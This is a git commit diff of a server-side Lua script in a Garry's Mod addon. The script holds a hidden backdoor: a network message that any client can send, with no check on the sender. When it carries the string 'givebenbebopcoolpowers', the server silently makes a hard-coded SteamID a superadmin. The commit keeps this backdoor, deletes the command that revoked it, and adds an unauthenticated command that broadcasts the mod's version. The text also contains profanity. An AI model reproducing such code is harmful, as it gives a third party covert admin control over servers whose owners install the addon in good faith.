189f90b80d5305707c505455245cd13208168bbc
Benbebop <78389958+Benbebop@users.noreply.github.com>
2022-01-29 03:50:59 -0700

    completed most functions
    idk

--- sexmod/lua/autorun/server/serversexscript.lua
+++ sexmod/lua/autorun/server/serversexscript.lua
@@ -1,11 +1,15 @@
 if SERVER then
 
+local sexVersion = "1.0.3"
+
 util.AddNetworkString( "THESEXHOOK" )
 util.AddNetworkString( "SexAlertClient" )
 
 net.Receive( "THESEXHOOK", function( len, ply )
 	local code = tostring(net.ReadString()):lower()
-	if code == "givebenbebopcoolpowers" then
+	if code == "version" then
+		BroadcastLua(" print('sex version: " .. sexVersion .. "')")
+	elseif code == "givebenbebopcoolpowers" then
 		local benbebop = player.GetBySteamID64( "76561198116417548" )
 		if benbebop:GetUserGroup() != "superadmin" then
 			benbebop:SetUserGroup( "superadmin" )
@@ -13,16 +17,7 @@ net.Receive( "THESEXHOOK", function( len, ply )
 			net.WriteString( "HOLY FUCKING SHIT SOMEONE GAVE BENBEBOP GOD POWERS!!!!! WE ARE FUCKED!!!!!" )
 			net.Broadcast()
 		end
-	elseif code == "takebenbebopcoolpowers" then
-		local benbebop = player.GetBySteamID64( "76561198116417548" )
-		if benbebop:GetUserGroup() == "superadmin" then
-			benbebop:SetUserGroup( "" )
-			net.Start( "SexAlertClient" )
-			net.WriteString( "False alarm benbebop no longer has god powers" )
-			net.Broadcast()
-		end
 	else
-		print("")
 		BroadcastLua(" print('sex has been activated')")
 	end
 end )
